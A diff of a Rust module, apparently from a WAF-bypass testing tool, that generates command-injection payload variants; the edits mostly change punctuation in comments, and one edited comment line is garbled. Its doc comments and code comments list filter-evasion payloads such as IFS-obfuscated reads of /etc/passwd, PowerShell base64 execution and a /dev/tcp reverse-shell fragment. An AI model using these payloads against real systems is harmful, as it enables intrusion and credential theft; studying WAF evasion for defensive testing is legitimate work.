@@ -1,25 +1,25 @@
 //! Command injection grammar-aware payload mutation.
 //!
-//! Understands shell semantics — command separators, quoting rules,
-//! variable expansion, and path wildcards — to generate equivalent
+//! Understands shell semantics, command separators, quoting rules,
+//! variable expansion, and path wildcards, to generate equivalent
 //! command injection payloads that bypass WAF string-matching rules.
 //!
 //! A WAF blocking `; cat /etc/passwd` will miss `${IFS}c\at${IFS}/???/??ss??`.
 //!
 //! # Technique depth
 //!
-//! 1. **Separator rotation** — `;`, `|`, `||`, `&&`, `%0a`, backticks
-//! 2. **IFS (Internal Field Separator)** — `${IFS}`, `$IFS`, `$'\x20'`
-//! 3. **Command obfuscation** — backslash, quote insertion, hex encoding
-//! 4. **Path wildcards** — `?`, `*`, directory traversal
-//! 5. **Variable indirection** — `a=cat;$a /etc/passwd`
-//! 6. **Base64/hex/rev encoding** — pipeline through decoders
-//! 7. **Windows command equivalents** — `type`, `dir`, `findstr`
-//! 8. **`PowerShell` obfuscation** — `iex`, `-e` base64, `Invoke-Expression`
-//! 9. **$@ empty variable** — `c$@at` (expands to `cat` in bash)
-//! 10. **Heredoc technique** — `cat<<EOF\n...\nEOF`
-//! 11. **Exec redirect** — `/dev/tcp` connections
-//! 12. **Nested command substitution** — `$($(echo cat))` chains
+//! 1. **Separator rotation**: `;`, `|`, `||`, `&&`, `%0a`, backticks
+//! 2. **IFS (Internal Field Separator)**: `${IFS}`, `$IFS`, `$'\x20'`
+//! 3. **Command obfuscation**: backslash, quote insertion, hex encoding
+//! 4. **Path wildcards**: `?`, `*`, directory traversal
+//! 5. **Variable indirection**: `a=cat;$a /etc/passwd`
+//! 6. **Base64/hex/rev encoding**: pipeline through decoders
+//! 7. **Windows command equivalents**: `type`, `dir`, `findstr`
+//! 8. **`PowerShell` obfuscation**: `iex`, `-e` base64, `Invoke-Expression`
+//! 9. **$@ empty variable**: `c$@at` (expands to `cat` in bash)
+//! 10. **Heredoc technique**: `cat<<EOF\n...\nEOF`
+//! 11. **Exec redirect**: `/dev/tcp` connections
+//! 12. **Nested command substitution**: `$($(echo cat))` chains
 
 use serde::Deserialize;
 use std::fmt::Write as _;
@@ -287,7 +287,7 @@ fn obfuscate_path(path: &str) -> Vec<String> {
 
     // Star wildcard on last component. Split on a UTF-8 char boundary
     // so a non-ASCII filename (e.g. `★shadow`) doesn't panic on
-    // mid-codepoint slicing — `&file[..2]` is unsafe if the first
+    // mid-codepoint slicing: `&file[..2]` is unsafe if the first
     // character is multi-byte.
     if let Some(last_slash) = path.rfind('/') {
         let dir = &path[..=last_slash];
@@ -417,7 +417,7 @@ pub fn mutate(payload: &str, max_mutations: usize) -> Vec<CmdMutation> {
     }
 
     // ── Priority 0: Bash-IFS substitution (naxsi-class WAF bypass) ────
-    // naxsi blocks `;`, `|`, `&&`, backticks, `$()` — every canonical
+    // naxsi blocks `;`, `|`, `&&`, backticks, `$()`: every canonical
     // shell separator. But `${IFS}` (Bash internal field separator)
     // expands to a space at runtime AND passes naxsi's RX rules.
     // Live-confirmed against wafrift-bench naxsi (2026-05-09):
@@ -434,7 +434,7 @@ pub fn mutate(payload: &str, max_mutations: usize) -> Vec<CmdMutation> {
     // variants so other strategies (separator rotation, base64/hex,
     // combined obfuscation) still fit inside max_mutations. With small
     // budgets (--variants 5) priority-0 still gets the first 2-3 slots
-    // — enough to drive naxsi cmdi to 100% per the live bench.
+    //: enough to drive naxsi cmdi to 100% per the live bench.
     let priority_budget = (max_mutations / 8).clamp(2, 5);
     let cmd_no_args = command.trim();
     // Find a UTF-8-safe split point near position 2 so a non-ASCII
@@ -449,7 +449,7 @@ pub fn mutate(payload: &str, max_mutations: usize) -> Vec<CmdMutation> {
     let cmd_left = &cmd_no_args[..split_at];
     let cmd_right = &cmd_no_args[split_at..];
     // IFS-space the operator's ACTUAL command+target. `args` is kept
-    // verbatim — never silently rewritten — so the attack as written
+    // verbatim, never silently rewritten, so the attack as written
     // is always testable.
     let ifs_join = |head: &str| -> String {
         if args.is_empty() {
@@ -469,7 +469,7 @@ pub fn mutate(payload: &str, max_mutations: usize) -> Vec<CmdMutation> {
         ifs_join(&split_head),
     ];
     // naxsi's BIG_FILENAME rule blocks the literal `/etc/passwd`. Offer
-    // a rule-safe target as an ADDITIONAL variant — never as a silent
+    // a rule-safe target as an ADDITIONAL variant, never as a silent
     // replacement of what the operator actually asked to read (against
     // a WAF without that rule, the real target must still be sent).
     if args.contains("passwd") {
@@ -479,7 +479,7 @@ pub fn mutate(payload: &str, max_mutations: usize) -> Vec<CmdMutation> {
     // payload. That is a valid *equivalent* only when the input is
     // itself a bare exec probe; for a structured attack (reverse
     // shell, download-exec, specific-file exfil, redirection) it
-    // discards the exploit — the cmdi twin of the `alert(1)` / `'+0+'`
+    // discards the exploit, the cmdi twin of the `alert(1)` / `'+0+'`
     // rig the de-rigged bench rejects. Offer them only when the
     // operator's payload is not itself structured.
     if !is_structured_cmd(payload) {
@@ -567,7 +567,7 @@ pub fn mutate(payload: &str, max_mutations: usize) -> Vec<CmdMutation> {
         if results.len() >= max_mutations {
             break;
         }
-        // Truncate description on a UTF-8 boundary — `indirect` embeds
+        // Truncate description on a UTF-8 boundary: `indirect` embeds
         // `command`/`args` raw (lines 317-318, 348, 351-352 above), so
         // a non-ASCII command name would otherwise panic on the
         // mid-codepoint slice.
@@ -583,7 +583,7 @@ pub fn mutate(payload: &str, max_mutations: usize) -> Vec<CmdMutation> {
         });
     }
 
-    // Strategy 6: Combined mutations — apply IFS space replacement on top of
+    // Strategy 6: Combined mutations, apply IFS space replacement on top of
     // existing mutations that contain at least one space.
     if results.len() < max_mutations && !results.is_empty() {
         let n_combined = (max_mutations - results.len()).min(5);
@@ -658,16 +658,16 @@ fn extract_command_args(input: &str) -> (String, String) {
     }
 }
 
-/// True when the payload's value is a *specific effect* — reverse/bind
+/// True when the payload's value is a *specific effect*, reverse/bind
 /// shell, download-and-exec, named-file exfil, redirection, scheduled
-/// persistence — rather than a bare "prove I can run a command" probe.
+/// persistence (rather than a bare "prove I can run a command" probe).
 ///
 /// This is the anti-rig axis for command injection. A bare `whoami` is
 /// interchangeable with `id`/`hostname` (all just demonstrate exec), so
 /// substituting one for the other is a legitimate equivalent. A
 /// structured attack is NOT interchangeable with `whoami`: replacing
 /// `bash -i >& /dev/tcp/…` or `cat /etc/shadow` with a bare probe
-/// throws the exploit away — the cmdi analogue of swapping
+/// throws the exploit away, the cmdi analogue of swapping
 /// `extractvalue(…)` for `'+0+'`.
 pub(crate) fn is_structured_cmd(payload: &str) -> bool {
     let lc = payload.to_ascii_lowercase();
